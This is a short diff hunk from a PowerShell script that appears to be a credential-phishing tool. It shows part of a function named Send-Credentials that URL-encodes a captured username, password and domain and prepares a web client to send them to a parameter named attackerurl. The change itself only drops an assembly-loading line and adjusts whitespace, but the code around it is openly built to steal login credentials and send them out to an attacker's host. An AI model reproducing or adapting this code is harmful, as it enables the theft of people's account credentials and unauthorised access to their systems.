@@ -200,8 +200,7 @@ function Validate-or-Request ([String] $username,[String] $password, [String] $d
 
 function Send-Credentials([String] $username, [String] $password, [String] $domain, [String] $attackerurl)
 {
-	[System.Reflection.Assembly]::LoadWithPartialName("System.web")
- 	$wc = New-Object system.Net.WebClient;
+	$wc = New-Object system.Net.WebClient;
  	$username = [System.Web.HttpUtility]::UrlEncode($username);
  	$password = [System.Web.HttpUtility]::UrlEncode($password);
  	$domain = [System.Web.HttpUtility]::UrlEncode($domain);
@@ -211,5 +210,5 @@ function Send-Credentials([String] $username, [String] $password, [String] $doma
  	}
 	Catch
 	{
-    	}	
+    }	
 }
